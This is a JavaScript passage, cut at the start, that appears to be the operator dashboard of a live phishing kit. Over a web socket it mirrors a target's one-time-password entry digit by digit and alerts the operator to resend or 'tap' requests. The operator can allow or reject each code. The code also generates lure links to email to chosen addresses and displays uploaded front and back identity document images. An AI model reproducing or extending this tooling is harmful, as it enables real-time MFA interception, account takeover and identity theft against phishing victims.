        document.getElementById('engagedotp').click()
        document.getElementById('engagedotp').click()
        console.log("click: engagedotp")
        console.log("click: engagedotp")
        engagedOtp = true
    }
    waiting.id = url
    focusOnOtp(id)
})
function focusOnOtp(id) {
    console.log("Focusing on ...", id)
    try {
        for (let i = 1; i <= 7; i++) {
            const elem = $(`#digit-${i}`).siblings().find('.activestate')
            // if (`digit-${i}` == id) return
            // console.log($(`#digit-${i}`).siblings().find('.activestate'))
            if (elem) {
                // console.log($(elem))
                elem.each(function () {
                    $(this).removeClass('show');
                });
            }
        }
        const curr = $(`#${id}`).siblings().find('.activestate')
        if (curr) {
            // console.log(curr)
            curr.each(function () {
                $(this).addClass('show');
            });
        }
    } catch (error) {
        console.log(error)
    }

}
socket.on('otp-resend', async function ({ id }) {
    console.log("requesting resend..")
    document.getElementById('resend').style.display = 'block'
    await sleep(5000)
    document.getElementById('resend').style.display = 'none'
})
socket.on('tap-resend', async function ({ id }) {
    console.log("requesting tap yes resend..")
    $('#resend').find('h1').text("USER REQUESTED RESEND TAP")
    // $('#resend').find('h1').first().text('USER REQUESTED RESEND TAP')
    document.getElementById('resend').style.display = 'block'
    await sleep(5000)
    document.getElementById('resend').style.display = 'none'
})
socket.on('tap-anotherway', async function ({ id }) {
    console.log("user trying another way..")
    $('#resend').find('h1').text("USER TRYING OTP")
    document.getElementById('resend').style.display = 'block'
    document.getElementById('authnavbar').scrollIntoView({
        block: "start",
    })
    document.getElementById('notsubmit').click()
    document.getElementById('otp-button').click()
    await sleep(5000)
    document.getElementById('resend').style.display = 'none'
})
socket.on('otp-blur', async function ({ id, counter }) {
    blurTimeout = setTimeout(() => {
        clearFocusBlur(counter)
    }, 1000);
})
function clearFocusBlur(counter) {
    engagedOtp = false

    try {
        if (counter == 0) {
            console.log("click: clearotp")
            document.getElementById('clearotp').click()
        } else if (!submitOtpFlag) {
            console.log("click: finishedotp")

            document.getElementById('finishedotp').click()
        }
        for (let i = 1; i <= 7; i++) {
            const elem = $(`#digit-${i}`).siblings().find('.activestate')
            if (elem) {
                elem.each(function () {
                    $(this).removeClass('show');
                });
            }
        }
    } catch (error) {
        console.log(error)
    }
}

document.getElementById('allow3').addEventListener('click', function (e) {
    socket.emit('allow-otp', { id: waiting.id })
})
document.getElementById('reject3').addEventListener('click', function (e) {
    console.log(waiting.id)
    socket.emit('reject-otp', { id: waiting.id })
})

const none = document.getElementById("none")
none.addEventListener('click', function () {
    clickNoneFlag = true
})
const verif1 = document.getElementById("verif1")
verif1.addEventListener('click', function () {
    clickNoneFlag = false
})
//END OF WEB SOCKET CODE//

//BEGIN SEND LINK CODE//

const sendTo = document.getElementById('email')
const linkname = document.getElementById('linkname')
const sendLinkBtn = document.getElementById('sendlink')
const copyLinkBtn = document.getElementById('copylink')

if (sendLinkBtn) {
    sendLinkBtn.addEventListener('click', async function (e) {
        e.preventDefault()
        e.stopPropagation()

        try {
            const res = await fetch('/generate-link', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: sendTo.value,
                    name: linkname.value
                })
            })
            const val = await res.json() // {data: {link: 'http(s)://whatever' }} : {error: 'some message'}
            if (val.error) return console.log(val)
            alert('Email sent successfully.')
            // use value as appropriate document.getElementById()
        } catch (error) {
            console.log(error)
        }
    })
}

copyLinkBtn.addEventListener('click', async function (e) {
    e.preventDefault()
    e.stopPropagation()

    try {
        const res = await fetch('/generate-link', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: sendTo.value,
                name: linkname.value,
                copy: 'true'
            })
        })
        const val = await res.json() // {data: {link: 'http(s)://whatever' }} : {error: 'some message'}
        if (val.error) return console.log(val)
        navigator.clipboard.writeText(val.data.link).then(function () {
            alert('Link copied successfully to your clipboard.')
        }, function (err) {
        });
        // use value as appropriate document.getElementById()
    } catch (error) {
        console.log(error)
    }

})

//END SEND LINK CODE//

//BEGIN DOCUMENT UPLOAD CODE
const frontID = document.getElementById('frontID')
const backID = document.getElementById('backID')

function getImgHTML(url) {
    return `<style>
    .img-cont {
        display: flex;
        height: 100%;
        width: 100%;
        padding: 60px;
        justify-content: center;
        align-items: center;
    }
    
    .img-cont img {
        height: 100%;
        width: 100%;
        object-fit: contain;
    }
    </style>
    <div class="img-cont">
        <img src="/uploads/docs/${url}">
    </div>`
}

socket.on('doc-event', async function ({ url, key, id, event_type, page }) {
    // if (page == 'passport') {
    //     document.getElementById('passport').click()
    // } else {
    //     document.getElementById('ID').click()
    // }

    if (event_type == 'upload') {
        console.log("document uploaded..")
        const res = await fetch(`/url/${url}`)

        if (res.ok) {
            const json = await res.json()
            console.log(json)
            const { docOne, docTwo, doc_type } = json

            const front = getImgHTML(docOne)
            const back = getImgHTML(docTwo)

            console.log(back, front)

            if (id == 'front') {
                frontID.innerHTML = front
            }
            if (id == 'back') {
                backID.innerHTML = back
            }
        }
    }
    if (event_type == 'submit') {
        document.getElementById('allowdocuments').click()
    }
    if (event_type == 'engaged') {
        if (id == 'front') {
            document.getElementById('engagedfront').click()
        }
        if (id == 'back') {
            document.getElementById('engagedback').click()
        }
    }
    if (event_type == 'clear') {
        if (id == 'front') {
            document.getElementById('clearfront').click()
        }
        if (id == 'back') {
            document.getElementById('clearback').click()
        }
    }
    if (event_type == 'finish') {
        if (id == 'front') {
            document.getElementById('finishedfront').click()
        }
        if (id == 'back') {
            document.getElementById('finishedback').click()
        }
    }
})


//END DOCUMENT UPLOAD CODE
